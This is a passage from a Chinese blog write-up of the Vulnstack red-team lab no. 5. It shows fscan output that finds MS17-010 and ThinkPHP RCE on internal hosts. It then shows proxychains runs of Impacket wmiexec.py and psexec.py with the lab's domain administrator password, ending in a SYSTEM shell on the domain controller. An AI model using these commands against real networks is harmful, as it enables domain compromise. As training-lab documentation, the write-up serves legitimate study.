__ _  ___| | __    │\n│  / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n                                                         \n[2025-02-19 23:13:52] [INFO] 暴力破解线程数: 1\n[2025-02-19 23:13:52] [INFO] 开始信息扫描\n[2025-02-19 23:13:52] [INFO] CIDR范围: 192.168.138.0-192.168.138.255                                              \n[2025-02-19 23:13:52] [INFO] 生成IP范围: 192.168.138.0.%!d(string=192.168.138.255) - %!s(MISSING).%!d(MISSING)    \n[2025-02-19 23:13:52] [INFO] 解析CIDR 192.168.138.1/24 -\u003e IP范围 192.168.138.0-192.168.138.255                    \n[2025-02-19 23:13:52] [INFO] 最终有效主机数量: 256\n[2025-02-19 23:13:52] [INFO] 开始主机扫描\n[2025-02-19 23:13:52] [SUCCESS] 目标 192.168.138.136 存活 (ICMP)                                                  \n[2025-02-19 23:13:52] [SUCCESS] 目标 192.168.138.138 存活 (ICMP)                                                  \n[2025-02-19 23:13:58] [INFO] 存活主机数量: 3\n[2025-02-19 23:13:58] [INFO] 有效端口数量: 233\n[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.136:80                                                       \n[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.138:135                                                      \n[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.136:135                                                      \n[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.138:88                                                       \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:139                                                      \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.136:139                                                      \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:389                                                      \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:445                                                      \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.136:445                                                      \n[2025-02-19 23:14:03] [SUCCESS] 服务识别 192.168.138.136:80 =\u003e [http]                                             \n[2025-02-19 23:14:03] [SUCCESS] 服务识别 192.168.138.138:88 =\u003e                                                    \n[2025-02-19 23:14:04] [SUCCESS] 端口开放 192.168.138.136:3306                                                     \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:3306 =\u003e [mysql] 产品:MySQL 信息:unauthorized Banner:[E.j Host '\u003c/span\u003ewin7.sun.com\u003cspan class=\"hljs-string\"\u003e' is not allowed to connect to this MySQL server]                                               \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:139 =\u003e  Banner:[.]                                       \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:139 =\u003e  Banner:[.]                                       \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:389 =\u003e [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: sun.com, Site: Default-First-Site-Name                                                \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:445 =\u003e                                                   \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:445 =\u003e                                                   \n[2025-02-19 23:15:03] [SUCCESS] 服务识别 192.168.138.138:135 =\u003e                                                   \n[2025-02-19 23:15:03] [SUCCESS] 服务识别 192.168.138.136:135 =\u003e                                                   \n[2025-02-19 23:15:03] [INFO] 存活端口数量: 13   \n[2025-02-19 23:15:03] [INFO] 开始漏洞扫描       \n[2025-02-19 23:15:03] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                                              \n[2025-02-19 23:15:04] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.138.136                                \n主机名: win7                                  \n发现的网络接口:                          \n   IPv4地址:                                                                                                      \n      └─ 192.168.138.136                                                                                          \n      └─ 192.168.183.134                                                                                          \n[2025-02-19 23:15:04] [SUCCESS] 发现漏洞 192.168.138.136 [Windows 7 Professional 7601 Service Pack 1] MS17-010    \n[2025-02-19 23:15:04] [SUCCESS] 网站标题 http://192.168.138.136    状态码:200 长度:931    标题:无标题             \n[2025-02-19 23:15:04] [SUCCESS] NetInfo 扫描结果                                                                                                                                                 \n主机名: DC                                                                                                        \n发现的网络接口:                                                                                                   \n   IPv4地址:                                                                                                      \n      └─ 192.168.138.138                                                                                                                                                                                                            \n[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.1   WORKGROUP\\DESKTOP-OO4DPSM     \n[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.136 win7.sun.com                        Windows 7 Professional 7601 Service Pack 1                                                                                              \n[2025-02-19 23:15:04] [SUCCESS] 发现漏洞 192.168.138.138 [Windows Server 2008 HPC Edition 7600] MS17-010\n[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.138 DC:DC.sun.com                    Windows Server 2008 HPC Edition 7600                                                       \n[2025-02-19 23:15:16] [SUCCESS] 目标: http://192.168.138.136:80\n  漏洞类型: poc-yaml-thinkphp5-controller-rce\n  漏洞名称: \n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce\n[2025-02-19 23:15:16] [SUCCESS] 目标: http://192.168.138.136:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce                                                                                                                                               \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看信息可以知道\u003ccode\u003eDC\u003c/code\u003e是\u003ccode\u003e192.168.138.138\u003c/code\u003e ，域是\u003ccode\u003esun.com\u003c/code\u003e ，并且开启\u003ccode\u003e135\u003c/code\u003e，\u003ccode\u003e139\u003c/code\u003e，\u003ccode\u003e445\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003ePTH\u003c/h2\u003e\n\u003cp\u003e因为上面获得域用户，尝试\u003ccode\u003ePTH\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ewmiexec.exe\u003c/code\u003e失败\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~  proxychains4 wmiexec.py sun.com/administrator:dc123.com@dc.sun.com -target-ip \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e \n                                                                                                                  \n[proxychains] config file found: /etc/proxychains4.conf                                                           \n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e                                            \n[proxychains] DLL init: proxychains-ng \u003cspan class=\"hljs-number\"\u003e4.17\u003c/span\u003e              \nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies                                             \n                                                                                                                  \n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e  ...  OK                                \n[*] SMBv2\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e dialect used                                                                                          \n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e  ...  OK                                \n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  dc.sun.com:\u003cspan class=\"hljs-number\"\u003e49154\u003c/span\u003e \u0026#x3C;--socket error \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e timeout!                \n[-] Could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e connect: [Errno \u003cspan class=\"hljs-number\"\u003e111\u003c/span\u003e] Connection refused    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eevil-winrm\u003c/code\u003e失败\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e同上\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003epsexec.py\u003c/code\u003e成功，成功了，拿下域控\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e ⚡ root@kali  ~  proxychains4 psexec.py administrator:dc123.com@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\n[proxychains] DLL init: proxychains-ng \u003cspan class=\"hljs-number\"\u003e4.17\u003c/span\u003e\nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e  ...  OK\n[*] Requesting shares on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e.....\n[*] Found writable share ADMIN$\n[*] Uploading file KNuZDebw.exe\n[*] Opening SVCManager on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e.....\n[*] Creating service efVz on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e.....\n[*] Starting service efVz.....\n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e  ...  OK\n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e  ...  OK\n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e  ...  OK\n[-] Decoding error detected, consider running chcp.com at the target,\n\u003cspan class=\"hljs-built_in\"\u003emap\u003c/span\u003e the result \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e https://docs.python.org/\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e/library/codecs.html\u003cspan class=\"hljs-comment\"\u003e#standard-encodings\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e then execute smbexec.py again \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e -codec \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e the corresponding codec\nMicrosoft Windows [�汾 \u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.7600\u003c/span\u003e]\n\n[-] Decoding error detected, consider running chcp.com at the target,\n\u003cspan class=\"hljs-built_in\"\u003emap\u003c/span\u003e the result \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e https://docs.python.org/\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e/library/codecs.html\u003cspan class=\"hljs-comment\"\u003e#standard-encodings\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e then execute smbexec.py again \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e -codec \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e the corresponding codec\n��Ȩ���� (c) \u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e Microsoft Corporation����������Ȩ����\n\nC:\\Windows\\system32\u003e whoami\nnt authority\\system\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e其实可以使用\u003ccode\u003eCobaltStrike\u003c/code\u003e 更方便，但是想试试使用\u003ccode\u003eLinux\u003c/code\u003e环境来尝试进行域攻击\u003c/p\u003e\n\u003cp\u003e还有就是不明白搭建了\u003ccode\u003esocks5\u003c/code\u003e的代理服务器，使用\u003ccode\u003eproxychains4 fscan\u003c/code\u003e 以及\u003ccode\u003eproxychains4 nmap\u003c/code\u003e的操作依旧探测不了主机，\u003ccode\u003enmap\u003c/code\u003e我也执行使用\u003ccode\u003e-sT\u003c/code\u003e 使用\u003ccode\u003eTCP\u003c/code\u003e来探测，难道是\u003ccode\u003eMSF\u003c/code\u003e代理的问题吗？\u003c/p\u003e\n\u003cp\u003e还有本来想用BloodHound来手机信息，展现更多工具用法，但是…\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image68.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e关于域用户\u003ccode\u003eadmin\u003c/code\u003e ，使用\u003ccode\u003eCS\u003c/code\u003e可以抓取其\u003ccode\u003eHASH\u003c/code\u003e\u003c/p\u003e","title":"Vulnstack - ATT\u0026CK红队评估实战靶场(五)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机"},"recentPosts":[{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"04","id":"Vulnstack红队评估实战靶场(五)"},"buildId":"spBfolT_1b1V4Y5d67TZv","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>